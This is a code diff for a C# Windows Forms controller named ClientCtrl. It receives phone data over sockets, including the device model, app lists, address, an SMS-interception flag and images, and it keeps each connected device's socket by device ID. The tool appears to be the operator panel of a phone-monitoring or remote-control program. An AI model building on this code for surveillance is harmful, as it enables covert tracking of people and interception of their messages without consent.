@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -74,34 +75,42 @@ namespace ClientCtrl
         {
             Socket socketServer = obj as Socket;
 
-            int index = this.dataGridView1.Rows.Add();
-            this.dataGridView1.Rows[index].Cells[0].Value = "第" + index + "条";
-            this.dataGridView1.Rows[index].Cells[1].Value = "alis";
-            IPEndPoint clientipe = (IPEndPoint)socketServer.RemoteEndPoint;
-            this.dataGridView1.Rows[index].Cells[2].Value = "" + clientipe.Address.ToString();
+
 
             byte[] headerByte = new byte[3];
             socketServer.Receive(headerByte);
             String header = System.Text.UTF8Encoding.Default.GetString(headerByte);
-            listBox_log.Items.Add("client:===header:"+ header);
+            listBox_log.Items.Add("client:===header:" + header);
 
             byte[] buffer = new byte[10 * 1024 * 1024];
             int length = 0;
 
-            if ("str".Equals(header)) {
+            if ("str".Equals(header))
+            {
                 StringBuilder sb = new StringBuilder();
                 while ((length = socketServer.Receive(buffer)) > 0)
                 {
                     sb.Append(UTF8Encoding.UTF8.GetChars(buffer));
 
                 }
-                ClientInfoBean clientInfo= AllUtils.jsonToObj(sb.ToString(), typeof(ClientInfoBean)) as ClientInfoBean;
+                ClientInfoBean clientInfo = AllUtils.jsonToObj(sb.ToString(), typeof(ClientInfoBean)) as ClientInfoBean;
+
+                if (clientInfo == null)
+                {
+                    return;
+                }
+                //upData
+                addDataList(clientInfo, socketServer);
+
                 UIAppList.updataAppsData(this.dataGridView_apps, clientInfo.appList);
+
+                IPEndPoint clientipe = (IPEndPoint)socketServer.RemoteEndPoint;
+                clientInfo.ipAddress = clientipe.Address.ToString();
                 UIAppList.updataPhoneInfo(this.listBox_phone_info, clientInfo);
 
                 return;
             }
-
+            //接受的是图片
             MemoryStream ms = new MemoryStream();
 
             while ((length = socketServer.Receive(buffer)) > 0)
@@ -110,17 +119,35 @@ namespace ClientCtrl
             }
 
             //string words = Encoding.UTF8.GetString(buffer, 0, buffer.Length);
-
             listBox_log.Items.Add("client:===img====");
             this.pictureBox1.Image = new Bitmap(ms);
             ms.Close();
-          
+
+
+        }
+        private Hashtable hashTableSocket;
+        //添加一条记录到列表
+        private void addDataList(ClientInfoBean clientInfo, Socket socket)
+        {
+            if (!hashTableSocket.ContainsKey(clientInfo.deviceId))
+            {
+                hashTableSocket.Add(clientInfo.deviceId, socket);
+
+                int index = this.dataGridView1.Rows.Add();
+                this.dataGridView1.Rows[index].Cells[0].Value = "第" + index + "条";
+                this.dataGridView1.Rows[index].Cells[1].Value = "alis";
+                this.dataGridView1.Rows[index].Cells[2].Value = clientInfo.phoneModle;
+                this.dataGridView1.Rows[index].Cells[3].Value = true;
+                this.dataGridView1.Rows[index].Cells[4].Value = clientInfo.isInterceptSMS;
+                this.dataGridView1.Rows[index].Cells[5].Value = clientInfo.address;
+            }
+          //  this.dataGridView1.DataSource = hashTableSocket;
 
         }
 
         private void addData()
         {
-
+            hashTableSocket = new Hashtable();
 
         }
 
@@ -136,7 +163,7 @@ namespace ClientCtrl
 
         private void dataGridView1_SelectionChanged(object sender, EventArgs e)
         {
-          //  MessageBox.Show("SelectionChanged:" + e);
+            //  MessageBox.Show("SelectionChanged:" + e);
         }
     }
 }
